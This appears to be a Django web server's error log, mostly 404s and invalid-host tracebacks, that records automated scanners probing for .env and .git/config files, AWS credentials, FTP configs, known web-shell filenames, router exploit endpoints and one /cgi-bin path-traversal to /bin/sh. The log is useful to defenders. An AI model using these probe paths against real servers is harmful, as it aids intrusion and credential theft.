Not Found: /.env.secret
Not Found: /cms/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /wp-admin/install.php
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /GponForm/diag_Form
Not Found: /phpmyadmin/index.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sitemap
Not Found: /api/bin/123123
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /GponForm/diag_Form
Not Found: /libs/js/iframe.js
Not Found: /elmah.axd
Not Found: /elmah/
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /sftp-config.json
Not Found: /ftp-config.json
Not Found: /config.json
Not Found: /sftp.json
Not Found: /.vscode/ftp.json
Not Found: /ftp.json
Not Found: /.vscode/ftp-config.json
Not Found: /.vscode/sftp-config.json/vendor/.vscode/ftp.json
Not Found: /vendor/.vscode/sftp.json
Not Found: /vendor/.vscode/sftp-config.json
Not Found: /CFIDE/administrator/
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /WuEL
Not Found: /a
Not Found: /download/file.ext
Not Found: /SiteLoader
Not Found: /mPlayer
Not Found: /robots.txt
Not Found: /youtube-video-downloader/index.html/
Not Found: /asp/GetRandCount.asp
Not Found: /index.html
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-login.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /index.html
Not Found: /contact.html
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /druid/index.html
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /actuator/gateway/routes
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /youtube-video-downloader/index.html/
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /wallet.json
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /youtube-video-downloader/contact.html/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-content/plugins/hellopress/wp_filemanager.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /.env
Not Found: /backend/.env
Not Found: /api/.env
Not Found: /info/
Not Found: /app_dev.php/_profiler/open
Not Found: /.env.example
Not Found: /phpinfo.php
Not Found: /.env.production
Not Found: /app_dev.php/_profiler/phpinfo
Not Found: /demo/.env
Not Found: /app/.env
Not Found: /core/.env
Not Found: /.aws/credentials
Not Found: /Application/.env
Not Found: /laravel/.env
Not Found: /settings/.env
Not Found: /home/.env
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /aws.yml
Not Found: /_static/.env
Not Found: /www/.env
Not Found: /system/.env
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /index.html
Not Found: /xmldata
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /elmah.axd
Not Found: /elmah/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /aaa9
Not Found: /aab9
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /cgi-bin/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /local/
Not Found: /modules/
Not Found: /Site/
Not Found: /system/
Not Found: /template/
Not Found: /shop/
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/css/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /.env_sample
Not Found: /env/.env
Not Found: /dashboard/.git/config
Not Found: /data/private/.git/config
Not Found: /modules/api/.git/config
Not Found: /data/processing/.git/config
Not Found: /.env.production
Not Found: /staging_environment/.git/config
Not Found: /.env.bak
Not Found: /.env.old
Not Found: /.env.testing
Not Found: /var/.env
Not Found: /data/config/.git/config
Not Found: /.env.sandbox
Not Found: /configuration/.env
Not Found: /build_tool/.git/config
Not Found: /images/.git/config
Not Found: /public_html/.git/config
Not Found: /.env.prod.local
Not Found: /production/.git/config
Not Found: /scripts/.git/config
Not Found: /staging_area/.git/config
Not Found: /v3/.git/config
Not Found: /config/.env
Not Found: /repo/.git/config
Not Found: /app/.git/config
Not Found: /cms/.git/config
Not Found: /sandbox/.git/config
Not Found: /user_area/.git/config
Not Found: /.env.cache
Not Found: /.env.dev
Not Found: /logs/current/.git/config
Not Found: /media../.git/config
Not Found: /static../.git/config
Not Found: /project/frontend/.git/config
Not Found: /.envrc
Not Found: /.env.secret
Not Found: /app/frontend/.git/config
Not Found: /lib/python/.git/config
Not Found: /logs/temp/.git/config
Not Found: /infra/.git/config
Not Found: /modules/.git/config
Not Found: /templates/.git/config
Not Found: /v1/.git/config
Not Found: /.env.staging.local
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /.env.testing.local
Not Found: /test_environment/.git/config
Not Found: /dev/backup/.git/config
Not Found: /modules/db/.git/config
Not Found: /prod/config/.git/config
Not Found: /public/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /sftp-config.json
Not Found: /ftp-config.json
Not Found: /config.json
Not Found: /.vscode/sftp.json
Not Found: /sftp.json
Not Found: /.vscode/ftp.json
Not Found: /ftp.json
Not Found: /.vscode/ftp-config.json
Not Found: /.vscode/sftp-config.json/vendor/.vscode/ftp.json
Not Found: /vendor/.vscode/sftp.json
Not Found: /vendor/.vscode/sftp-config.json
Not Found: /cgi-bin/.././././././././././bin/sh
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/config
Not Found: /device.rsp
Not Found: /ReportServer
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /sitemaps.xml
Not Found: /hudson
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /assets/filemanager/
Not Found: /assets/file-manager/
Not Found: /assets/filemanagers/
Not Found: /assets/filemanager/dialog.php
Not Found: /asset/filemanager/dialog.php
Not Found: /asset/filemanager/
Not Found: /asset/file-manager/
Not Found: /asset/filemanagers/
Not Found: /filemanager/
Not Found: /filemanager/dialog.php/assets/admin/js/filemanager/
Not Found: /dashboard/assets/filemanager/
Not Found: /assets/plugins/filemanager/dialog.php
Not Found: /assets/admin/js/tinymce/plugins/filemanager/dialog.php
Not Found: /plugins/filemanager/dialog.php
Not Found: /plugins/filemanager/
Not Found: /filemanager/
Not Found: /contents/filemanager/dialog.php
Not Found: /templates/filemanager/dialog.php
Not Found: /file-manager/dialog.php
Not Found: /fileman/dialog.php
Not Found: /vendor/filemanager/dialog.php
Not Found: /api/vendor/filemanager/
Not Found: /api/vendor/filemanager/dialog.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /sitemaps.xml
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /api/bin/123123
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /phpmyadmin/index.php
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
